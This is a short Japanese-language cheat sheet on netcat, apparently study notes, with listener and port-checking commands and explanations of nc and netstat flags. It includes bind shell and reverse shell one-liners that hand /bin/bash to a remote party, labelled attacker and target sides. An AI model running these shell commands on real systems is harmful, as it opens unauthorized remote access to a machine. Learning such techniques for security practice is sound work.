# How to Use Netcat

```bash
# ポート5555で接続を待ち受ける
nc -nlvp 5555

# 接続待ちのポートを調べる
netstat -atn
lsof -i

# Wireshark起動
sudo wireshark

# Netcatでターゲットに接続する
nc $IP 5555

# Bind Shell
# 接続側：netcatをサーバーとして動作させて、接続したらシェルを操作できるようにする
nc -nlvp 5555 -e /bin/bash

# 攻撃側から接続する
nc $IP 5555

# Reverse Shell
# 攻撃側
nc -nlvp 5555

# 接続側
nc $IP 5555 -e /bin/bash
```

---

## Netcat オプション解説

- `-n`  
  ホスト名解決を無効化。DNSを使わずIPアドレスで直接接続するため、速度が向上。

- `-l`  
  リスニングモードを有効化。他のデバイスからの接続を待機。

- `-v`  
  冗長モード（verbose mode）。接続元のIPやポートなど詳細情報を表示。

- `-p`  
  使用するポート番号を指定。例：`-p 5555` でポート5555を使用。

---

## netstat オプション解説

- `netstat`  
  ネットワーク統計情報を表示。接続中のソケット、リスニングポート、ルーティングテーブルなどを確認可能。

- `-a`  
  すべてのソケットを表示。リスニング中と確立済みの接続が両方表示される。

- `-t`  
  TCP接続のみを表示。UDPは除外。

- `-n`  
  IPアドレスとポート番号を数値形式で表示。ホスト名やサービス名に変換しないため表示が高速。
